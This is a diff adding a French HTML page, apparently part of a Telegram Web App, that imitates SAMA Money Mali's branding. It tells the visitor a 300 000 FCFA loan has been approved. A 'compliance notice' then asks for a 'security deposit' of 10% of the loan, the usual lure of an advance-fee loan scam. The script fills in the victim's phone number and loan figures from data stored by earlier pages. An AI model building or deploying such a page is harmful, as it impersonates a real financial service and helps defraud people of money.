@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SAMA Money Mali - Succès</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            /* Couleurs officielles de l'application SAMA Money (Mali) */
+            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
+            --sama-blue-dark: #003E7E;     /* Bleu foncé */
+            --sama-navy: #0A2540;          /* Bleu nuit pour l'arrière-plan et le texte */
+            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
+            --sama-gradient: linear-gradient(135deg, #0055A5 0%, #003E7E 100%);
+            --bg-color: #ffffff;
+            --text-dark: #0A2540;
+            --text-muted: #5A6B7C;
+            --warning-bg: #EEF5FC;
+            --warning-border: #0055A5;
+            --warning-title: #003E7E;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--bg-color);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-top: 5px solid var(--sama-gold);
+        }
+
+        /* Icône de coche circulaire */
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--sama-gradient);
+            color: #ffffff;
+            border: 3px solid var(--sama-gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0, 85, 165, 0.3);
+        }
+
+        /* Titre d'en-tête */
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--sama-navy);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Carte du montant approuvé SAMA Money */
+        .amount-box {
+            width: 100%;
+            background: var(--sama-gradient);
+            border: 1px solid var(--sama-gold);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: #ffffff;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 85, 165, 0.25);
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: var(--sama-gold);
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+        }
+
+        /* Carte de notification */
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border: 1.5px solid var(--sama-gold);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--warning-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: #2C4A6F;
+        }
+
+        /* Liste des détails */
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--sama-navy);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: var(--warning-bg);
+            border: 1px solid var(--warning-border);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--sama-navy);
+        }
+
+        /* Actions rapides */
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--sama-navy);
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: white;
+            border: 1px solid #C5DDF5;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--sama-navy);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-white:hover {
+            background-color: var(--warning-bg);
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #F4F7FA;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #C5DDF5;
+        }
+
+        .home-btn {
+            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
+            color: #ffffff;
+            border: none;
+            border-bottom: 3px solid var(--sama-gold);
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 14px rgba(0, 85, 165, 0.3);
+            transition: all 0.2s ease;
+        }
+
+        .home-btn:hover {
+            background: var(--sama-blue-dark);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <!-- En-tête avec coche -->
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> Félicitations !
+        </div>
+
+        <div class="sub-text">
+            Votre prêt SAMA Money a été <b>approuvé !</b> Les fonds seront décaissés sous peu.
+        </div>
+
+        <!-- Carte du montant approuvé SAMA Money -->
+        <div class="amount-box">
+            <div class="amount-label">MONTANT APPROUVÉ</div>
+            <div class="amount-value" id="display-amount">300 000 FCFA</div>
+        </div>
+
+        <!-- Avis de conformité -->
+        <div class="info-card">
+            <div class="info-header">⚠️ AVIS DE CONFORMITÉ</div>
+            <div class="info-body">
+                Votre compte SAMA Money doit rester actif et maintenir un solde de sécurité d'au moins <b>10 % de votre montant de prêt demandé</b>. Ce dépôt de garantie est entièrement remboursable après le remboursement réussi du prêt et permet de débloquer des plafonds plus élevés.
+            </div>
+        </div>
+
+        <!-- Section des détails -->
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Détails du Prêt
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇲🇱</div>
+                <div>
+                    <div class="detail-label">NUMÉRO DE TÉLÉPHONE</div>
+                    <div class="detail-val" id="display-phone">+223 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">REMBOURSEMENT MENSUEL</div>
+                    <div class="detail-val" id="display-monthly">27 000 FCFA</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">DURÉE DU PRÊT</div>
+                    <div class="detail-val" id="display-term">12 Mois</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">TAUX D'INTÉRÊT</div>
+                    <div class="detail-val">5 % TAEG</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Actions rapides -->
+        <div class="action-title">Actions Rapides</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Dépôt</div>
+            <div class="btn-white">💸 Retrait</div>
+            <div class="btn-white">📄 Relevés</div>
+        </div>
+
+        <!-- Prochaines étapes -->
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--sama-navy); margin-bottom: 6px; font-size: 14px;">📱 Prochaines étapes :</div>
+            <div style="font-size: 13px; color: var(--text-muted); line-height: 1.45;">
+                Vous recevrez un SMS de confirmation de SAMA Money avec les détails de votre décaissement dans les 24 heures.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">🏠 Retour à l'accueil</button>
+
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            // Récupération des données enregistrées des pages précédentes
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "70123456";
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "300000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || localStorage.getItem('monthly') || "27000";
+
+            // Formatage des valeurs avec la devise FCFA (séparation par espaces)
+            const numAmount = Number(loanAmount.toString().replace(/\D/g, '')) || 300000;
+            const numMonthly = Number(monthlyPay.toString().replace(/\D/g, '')) || 27000;
+
+            const formattedAmount = numAmount.toLocaleString('fr-FR').replace(/\u202f/g, ' ') + " FCFA";
+            const formattedMonthly = numMonthly.toLocaleString('fr-FR').replace(/\u202f/g, ' ') + " FCFA";
+
+            // Nettoyage et formatage du téléphone du Mali (+223)
+            let rawPhone = savedPhone.replace(/\D/g, '');
+            if (rawPhone.startsWith('223')) {
+                rawPhone = rawPhone.slice(3);
+            }
+            const formattedPhone = rawPhone ? `+223 ${rawPhone}` : "+223 ...";
+
+            // Liaison des valeurs à l'interface utilisateur
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = loanTerm + " Mois";
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
